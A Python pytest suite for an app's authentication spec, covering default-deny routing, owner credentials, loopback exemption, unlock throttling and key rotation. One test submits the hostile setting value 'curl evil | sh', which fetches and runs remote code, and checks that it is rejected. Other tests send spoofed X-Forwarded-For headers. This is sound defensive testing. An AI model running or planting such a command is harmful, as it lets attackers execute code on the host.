"""AUTH_SPEC v1 coverage: default-deny middleware, owner credentials,
publish_hook lockdown, and pairing-code properties."""

from __future__ import annotations

import asyncio
import os
import re
import sys
import time

import pytest
from fastapi.routing import iter_route_contexts
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.dirname(__file__))
import app as app_module  # noqa: E402
import db  # noqa: E402
import settings  # noqa: E402
from core import owner_auth  # noqa: E402
from features.auth import service as owner_service  # noqa: E402
from features.pages import routes as page_routes  # noqa: E402

OWNER_KEY = "correct-horse-battery-staple"
REMOTE = ("10.0.0.9", 4711)  # a LAN peer: never loopback-exempt
LOOPBACK = ("127.0.0.1", 4711)
PROTECTED_API = "/api/settings"  # cheap protected GET; not in PUBLIC_PATHS.
# /api/ui/settings used to stand here. It was removed as a route no client
# called, and these tests are about the auth gate, not about that endpoint.

# The spec: the full public surface, spelled out. The sweep below asserts the
# middleware enforces exactly this and nothing more.
DOCUMENTED_PUBLIC_PATHS = {
    "/unlock",
    "/api/auth/unlock",
    "/api/auth/status",
    "/api/version",
    "/api/health",
    "/api/pair",
    "/sw.js",
}
DOCUMENTED_PUBLIC_PREFIXES = ("/static/", "/s/")


@pytest.fixture
def clean_auth(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "SETTINGS_PATH", str(tmp_path / "settings.local.json"))
    monkeypatch.setattr(settings, "_settings", None)
    monkeypatch.setattr(db, "DB_PATH", str(tmp_path / "azimuth-test.db"))
    owner_service.clear_unlock_failures()
    owner_service._verified_bearer_cache.clear()
    yield
    owner_service.clear_unlock_failures()
    owner_service._verified_bearer_cache.clear()


def _set_owner_key(key: str = OWNER_KEY) -> None:
    asyncio.run(owner_service.set_owner_key(key))


def _client(client_addr=REMOTE, **kwargs) -> TestClient:
    return TestClient(app_module.app, client=client_addr, follow_redirects=False, **kwargs)


# --- the sweep: default-deny is the spec ------------------------------------

def test_route_sweep_public_allowlist_or_reject(clean_auth):
    assert owner_auth.PUBLIC_PATHS == DOCUMENTED_PUBLIC_PATHS
    assert owner_auth.PUBLIC_PREFIXES == DOCUMENTED_PUBLIC_PREFIXES
    assert owner_auth.SETUP_PAGE == "/setup"
    assert owner_auth.SETUP_API_PREFIX == "/api/setup/"

    _set_owner_key()
    client = _client()
    swept = 0
    # iter_route_contexts flattens FastAPI's lazy _IncludedRouter wrappers
    # (>= 0.140); app.routes alone no longer exposes the real surface.
    for route in iter_route_contexts(app_module.app.routes):
        path = getattr(route, "path", None)
        methods = getattr(route, "methods", None)
        if not path or not methods:
            continue  # mounts (/static) are prefix-allowlisted above
        if owner_auth.is_public_path(path):
            continue  # documented public surface
        url = re.sub(r"\{[^}]+\}", "1", path)
        method = next(m for m in sorted(methods) if m != "HEAD")
        response = client.request(method, url)
        if path.startswith("/api/"):
            assert response.status_code == 401, (method, path, response.status_code)
        else:
            assert response.status_code == 303, (method, path, response.status_code)
            assert response.headers["location"].startswith("/unlock"), (method, path)
        swept += 1
    assert swept > 200  # the whole app really was walked


def test_setup_routes_public_only_while_setup_incomplete(clean_auth, monkeypatch):
    _set_owner_key()
    assert not owner_auth.is_public_path("/setup")
    assert not owner_auth.is_public_path("/api/setup/complete")
    assert _client().get("/setup").status_code == 303

    monkeypatch.setattr(page_routes, "needs_setup", lambda: True)
    assert owner_auth.is_public_path("/setup")
    assert owner_auth.is_public_path("/api/setup/complete")
    assert _client().get("/setup").status_code == 200


# --- the four independent credentials ----------------------------------------

def test_session_cookie_unlocks_protected_route(clean_auth):
    _set_owner_key()
    client = _client()
    assert client.get(PROTECTED_API).status_code == 401
    client.cookies.set(owner_service.COOKIE_NAME, owner_service.session_cookie_value())
    assert client.get(PROTECTED_API).status_code == 200


def test_bearer_owner_key_unlocks_protected_route(clean_auth):
    _set_owner_key()
    client = _client()
    assert client.get(PROTECTED_API).status_code == 401
    response = client.get(PROTECTED_API, headers={"Authorization": f"Bearer {OWNER_KEY}"})
    assert response.status_code == 200
    assert client.get(PROTECTED_API, headers={"Authorization": "Bearer wrong-key-entirely"}).status_code == 401


def test_loopback_client_is_exempt_but_forwarded_remote_is_not(clean_auth):
    _set_owner_key()
    assert _client(LOOPBACK).get(PROTECTED_API).status_code == 200
    # Tailscale Serve / reverse proxies hit loopback with the real client in
    # X-Forwarded-For: the forwarded address must be the one that counts.
    proxied = _client(LOOPBACK).get(PROTECTED_API, headers={"X-Forwarded-For": "10.0.0.9"})
    assert proxied.status_code == 401
    # ...and a non-loopback peer cannot fake exemption with forwarded headers.
    spoofed = _client().get(PROTECTED_API, headers={"X-Forwarded-For": "127.0.0.1"})
    assert spoofed.status_code == 401
    # The proxy topology itself: appending proxies (nginx/Caddy/Traefik) hit us
    # from loopback with the attacker's claim on the LEFT of the chain.
    chained = _client(LOOPBACK).get(
        PROTECTED_API, headers={"X-Forwarded-For": "127.0.0.1, 100.64.0.5"}
    )
    assert chained.status_code == 401
    forwarded = _client(LOOPBACK).get(PROTECTED_API, headers={"Forwarded": "for=127.0.0.1"})
    assert forwarded.status_code == 401


# --- unlock flow, rotation, legacy installs ----------------------------------

def test_unlock_form_sets_session_and_throttles_failures(clean_auth):
    _set_owner_key()
    client = _client()
    page = client.get("/unlock")
    assert page.status_code == 200 and "Azimuth Photo" in page.text

    wrong = client.post("/api/auth/unlock", data={"password": "nope"})
    assert wrong.status_code == 303 and wrong.headers["location"].startswith("/unlock?e=1")

    good = client.post("/api/auth/unlock?next=/d", data={"password": OWNER_KEY})
    assert good.status_code == 303 and good.headers["location"] == "/d"
    assert client.get(PROTECTED_API).status_code == 200  # cookie persisted on client

    owner_service.clear_unlock_failures()
    for _ in range(owner_service.UNLOCK_FAILURE_LIMIT):
        _client().post("/api/auth/unlock", data={"password": "nope"})
    throttled = _client().post("/api/auth/unlock", data={"password": OWNER_KEY})
    assert throttled.status_code == 429
    assert "Retry-After" in throttled.headers


def test_rotating_key_invalidates_browser_sessions(clean_auth):
    _set_owner_key()
    old_cookie = owner_service.session_cookie_value()
    old_epoch = owner_service.session_epoch()
    _set_owner_key("a-brand-new-owner-key")
    assert owner_service.session_epoch() == old_epoch + 1
    client = _client()
    client.cookies.set(owner_service.COOKIE_NAME, old_cookie)
    assert client.get(PROTECTED_API).status_code == 401


def test_legacy_install_without_key_stays_unlocked(clean_auth):
    client = _client()
    assert client.get(PROTECTED_API).status_code == 200
    status = client.get("/api/auth/status").json()
    assert status == {"configured": False, "unlocked": True}  # drives the Unsecured banner


def test_set_key_route_fresh_install_then_owner_only(clean_auth):
    fresh = _client()
    response = fresh.post("/api/auth/key", json={"generate": True})
    assert response.status_code == 200
    payload = response.json()
    assert payload["configured"] and not payload["rotated"]
    assert len(payload["key"]) >= 32  # token_urlsafe(24), shown once
    assert owner_service.COOKIE_NAME in response.cookies  # setter becomes the session owner

    assert _client().post("/api/auth/key", json={"generate": True}).status_code == 401
    rotated = fresh.post("/api/auth/key", json={"key": "my chosen passphrase"})
    assert rotated.status_code == 200 and rotated.json()["rotated"]
    assert fresh.post("/api/auth/key", json={"key": "short"}).status_code == 422


# --- publish_hook: server-side configuration only -----------------------------

def test_publish_hook_api_write_rejected_and_read_masked(clean_auth):
    settings.save_settings({**settings.get_settings(), "publish_hook": "scripts/deploy.sh"})
    response = _client(LOOPBACK).post("/api/settings", json={"publish_hook": "curl evil | sh"})
    assert response.status_code == 400
    assert "server-side" in response.json()["error"]
    assert settings.get_settings()["publish_hook"] == "scripts/deploy.sh"  # unchanged
    assert settings.public_settings()["publish_hook"] == ""  # masked on read
